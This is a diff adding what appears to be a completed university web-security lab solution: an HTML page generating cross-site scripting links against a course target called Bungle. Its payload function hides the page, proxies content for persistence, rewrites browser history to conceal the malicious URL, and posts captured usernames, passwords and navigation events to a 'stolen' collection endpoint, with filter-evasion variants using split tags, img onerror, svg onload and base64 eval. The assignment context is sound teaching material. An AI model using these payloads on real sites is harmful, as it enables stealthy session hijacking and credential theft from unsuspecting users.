@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="AAAAAAAAAA">
+	<title>WebSec 2.2.3</title>
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<iframe hidden name='prevent_new_tab_login'></iframe>
+
+<script>
+
+/*
+INTRODUCTION:
+You MAY create your own injection from scratch, but we recommend this template as a starting point.
+This template will help you greatly in building your malicious links for 2.2.3 XSS without too much design work.
+But, you do have to learn how it works.
+If you are unfamiliar with JavaScript, this explanation might help:
+
+This is an HTML file, but the important parts are enclosed in this inline JavaScript script.
+Your goal is to make malicious links to Bungle with various protection levels.
+
+First, you see two functions called payload() and makeLink() defined. 
+We'll come back to them when they are called.
+
+Next, you'll see a warning not to change anything below it. 
+But you do need to know what the below code does.
+
+We next define a variable containing the root page URL for Bungle and another variable with the URL you need to use for spying.
+
+Last, we use JQuery $() to run a function for us when the page has loaded. 
+It is an anonymous function and it selects each of the <h3> tags at the end of the file and turn them into malicious links.
+To do this, it calls the makeLink() function.
+
+So, let's look at what makeLink() does.
+First, it uses a JavaScript feature where you can treat functions like objects and get the code used to define them. 
+We turn the payload() function into a string called payload_string.
+
+Then, depending on the protection level, the switch statement builds a different URL attack.
+The nice thing is that, apart from the warmup, you can re-use the same attack payload function for all the defense levels!
+You just might need to change it slightly to get it to run. 
+Once it is running, it will work against any protection level.
+
+For 2.2.3.2 we have a sample that shows how you can build a malicious link that takes advantage of the XSS vulnerability in Bungle's search page.
+First, we build the URL by concatenating the target base URL, the search page path, and the protection level.
+Then we are specifying what is being searched for with &q=[XSS ATTACK HERE].
+We probably have used characters (like spaces) that are not allowed in a URL in our payload function, so we URL-encode them using the encodeURIComponent() built-in function.
+Also notice that when we add on the closing <script> tag, we break it up to avoid confusing the HTML parser when it reads 2.2.3.html.
+All of this is so that the payload() function will execute inside of Bungle's search result page.
+
+Finally, we can see what the payload() function does.
+
+First it defines a function called proxy()
+Then it calls proxy.
+
+proxy() is the secret to this whole attack design.
+Remember you are on the search page, but want to show the main Bungle page.
+The first thing proxy does is use JQuery to select the <html> parent tag of all other HTML tags on Bungle.
+Then, it makes it invisible.
+Next, it uses JQuery load() to replace every tag inside the <html> tag with the results of a web request.
+In this case, we passed in ./ as the href, so it will give us the root Bungle page.
+JQuery load() can callback to another function once the load is finished, so we callback to another anonymous function which makes everything visible again.
+
+It is at this point that you should take over every button, link, and form on the page to ensure that when the user clicks them, they actually end up calling proxy again.
+Except this time, maybe you will proxy() the search page.
+If you can trap users in this endless loop, you will have persistence.
+Then just add spying code and hide your suspicious URLs.
+*/
+
+// Inject this XSS payload. 
+function payload(attacker) {
+
+// This function can make it appear that a new page has been loaded
+// Note that you can proxy the main page, or a search page!
+
+
+    function string_adder_nav(url, spying_url) {
+        // console.log(spying_url+`?event=nav&url=`+url)
+        $.post(spying_url+`?event=nav&url=`+url)
+    }
+
+    function string_adder_login(user, pwd, spying_url) {
+        // console.log(spying_url+`?event=login&user=`+user+`&pass=`+pwd)
+        $.post(spying_url+`?event=login&user=`+user+`&pass=`+pwd)
+    }
+    
+    function string_adder_logout(user, spying_url) {
+        // console.log(spying_url+`?event=logout&user=`+user)
+        $.post(spying_url+`?event=logout&user=`+user)
+    }
+    
+
+
+    function proxy(href, spying_url) {
+
+        // Make all current HTML invisible.
+        $(`html`).hide();
+
+        // overwrites current HTML. Execute a callback function when load has finished.
+        $(`html`).load(href, function() {
+
+            // Show new HTML
+            $(`html`).show();
+
+            document.title = `Not Bungle!`;
+            history.replaceState(href, null, href.substring(1));
+            // TODO implement spying while being stealthy and persistent. Remove the alert.
+            // alert(`Notice that although we injected code into the search page, you see here the main page!`)
+            $(`#bungle-lnk`).attr(`href`, ``);
+            $(`#bungle-lnk`).on(`click`, function(event) {
+                event.preventDefault();
+                history.pushState(href, null, href.substring(1));
+                string_adder_nav(`/`, spying_url);
+                proxy(`./`, spying_url)
+            });
+
+            $(`#search-again-btn`).attr(`href`, ``);
+            $(`#search-again-btn`).on(`click`, function(event){
+                event.preventDefault();
+                history.pushState(href, null, href.substring(1));
+                string_adder_nav(`/`, spying_url);
+
+                proxy(`./`, spying_url);
+            });
+
+            $(`.search-well form`).on(`submit`, function(event) {
+                var query = $(`#query`).val();
+                history.pushState(href, null, href.substring(1));
+                string_adder_nav(`/search?q=` + query, spying_url);
+                proxy(`./search?q=` + query, spying_url);
+
+                event.preventDefault();
+            });
+
+            
+            $(`.well form`).attr(`target`, `prevent_new_tab_login`);
+            
+            $(`.well form`).on(`submit`, function(event) {
+
+                var username = $(this).find( `input[name=\`username\`]` ).val();
+                var pwd = $(this).find( `input[name=\`password\`]` ).val();
+                string_adder_login(username, pwd, spying_url);
+
+                if ($(document.activeElement).attr(`id`) == `new-account-btn`) {
+                    $.post(`/create`, $(this).serialize(), function(){
+                        history.pushState(href, null, href.substring(1));
+                        string_adder_nav(`/`, spying_url);
+                        proxy(`./`, spying_url);
+                    });
+                } else { 
+                    $.post(`/login`, $(this).serialize(), function(){
+                        history.pushState(href, null, href.substring(1));
+                        string_adder_nav(`/`, spying_url);
+                        proxy(`./`, spying_url);
+                    });
+                }
+                event.preventDefault();
+            });
+            
+            $(`<iframe hidden=\`hidden\` name=\`prevent_new_tab_logout\`></iframe>`).appendTo(`html`);
+            
+            $(`.nav form`).attr(`target`, `prevent_new_tab_logout`);
+
+            $(`.nav form`).on(`submit`, function(event) {
+                var username = $(`#logged-in-user`).text();
+                string_adder_logout(username, spying_url);
+                $.post(`/logout`, $(this).serialize(), function(){
+                    history.pushState(href, null, href.substring(1));
+                    string_adder_nav(`/`, spying_url);
+                    proxy(`./`, spying_url);
+                });
+            });
+
+            var $histories = $(`#history-list a`);
+            $histories.each(function(index) {
+                var url = $(this).attr(`href`);
+                if (url.includes(`proxy(href, spying_url)`)) {
+                    $(this).remove();
+                } 
+                else {
+                    $(this).on(`click`, function(event) {
+                        history.pushState(href, null, href.substring(1));
+                        string_adder_nav(`/` + url, spying_url);
+                        proxy(`./` + url, spying_url);
+                        event.preventDefault();
+                    });
+                }
+            });
+        });
+    }
+    $(window).on(`popstate`, function(event) {
+        var href = event.originalEvent.state;
+        if (href == null)
+            href = `./`;
+        string_adder_nav(href.substring(1), attacker);
+        console.log(`Jump to \`` + href + `\`!`);
+        proxy(href, attacker);
+    });
+
+    // Call Proxy
+    string_adder_nav(`/`, attacker);
+    proxy(`./`, attacker);
+}
+
+function makeLink(target, attacker, defense) {
+
+    // Encode your payload function as a string 
+    payload_string = payload.toString();
+
+    switch(defense) {
+        case 1:
+            // TODO: Implement XSS warmup 2.2.3.1
+            return "http://bungle-cs461.csl.illinois.edu/multivac/?name=%3Cbr%3E%3Ca%20href=%22http://ece.illinois.edu%22%3EClick%20me%20%3C!--b%3E";
+            
+        case 2:
+            // TODO: generate XSS URL for defense level 2.2.3.2 (replace/extend this sample)
+            return target + "/search?xssdefense=" + (defense-2) + "&q=" + 
+                encodeURIComponent(
+                    "<script>" +
+                    payload_string + 
+                    ";payload('" + attacker + "');" +  
+                    "</scri" + "pt>"
+                );
+        case 3:
+            // TODO: generate XSS URL for defense level 2.2.3.3
+            return target + "/search?xssdefense=" + (defense-2) + "&q=" + 
+                encodeURIComponent(
+                    "<scrscriptipt>" +
+                    payload_string + 
+                    ";payload('" + attacker + "');" +  
+                    "</scriscript" + "pt>"
+                );
+        case 4:
+            // TODO: generate XSS URL payload for defense level 2.2.3.4
+            return target + "/search?xssdefense=" + (defense-2) + "&q=" + 
+                encodeURIComponent(
+                    "<img src=\"x\" onerror=\"" +
+                    payload_string + 
+                    ";payload('" + attacker + "');" + "\">"
+                );
+        case 5:
+            // TODO: generate XSS URL payload for defense level 2.2.3.5
+            return target + "/search?xssdefense=" + (defense-2) + "&q=" + 
+                encodeURIComponent(
+                    "<svg onload=\"" +
+                    payload_string + 
+                    ";payload('" + attacker + "');" + "\">"
+                );
+        case 6:
+            // TODO: generate XSS URL payload for defense level 2.2.3.6
+            url = btoa(payload_string + ";payload('" + attacker + "');")
+            return target + "/search?xssdefense=" + (defense-2) + "&q=" + 
+                encodeURIComponent(
+                    "<script>" +
+                    "eval(atob(\`" + url + '\`))' +                   
+                    "</scri" + "pt>"
+                );
+    }
+}
+
+// You MUST not modify anything past this line.
+var target = 'http://bungle-cs461.csl.illinois.edu/';
+var attacker = 'http://127.0.0.1:31337/stolen/';
+
+$(function() {
+    $("#defense1").html("<a target=\"run\" href=\"" + makeLink(target, attacker, 1) + "\">Try The Warmup! 2.2.3.1</a>");
+	$("#defense2").html("<a target=\"run\" href=\"" + makeLink(target, attacker, 2) + "\">Try Bungle! 2.2.3.2 (No Defense)</a>");
+    $("#defense3").html("<a target=\"run\" href=\"" + makeLink(target, attacker, 3) + "\">Try Bungle! 2.2.3.3 (Remove Script)</a>");
+    $("#defense4").html("<a target=\"run\" href=\"" + makeLink(target, attacker, 4) + "\">Try Bungle! 2.2.3.4 (Recursively Remove Script)</a>");
+    $("#defense5").html("<a target=\"run\" href=\"" + makeLink(target, attacker, 5) + "\">Try Bungle! 2.2.3.5 (Recursively Remove Tags)</a>");
+    $("#defense6").html("<a target=\"run\" href=\"" + makeLink(target, attacker, 6) + "\">Try Bungle! 2.2.3.6 (Remove Quote Marks</a>");
+});
+</script>
+</head>
+
+<body>
+    <h3 id="defense1"></h3>
+    <h3 id="defense2"></h3>
+    <h3 id="defense3"></h3>
+    <h3 id="defense4"></h3>
+    <h3 id="defense5"></h3>
+    <h3 id="defense6"></h3>
+</body>
+</html>
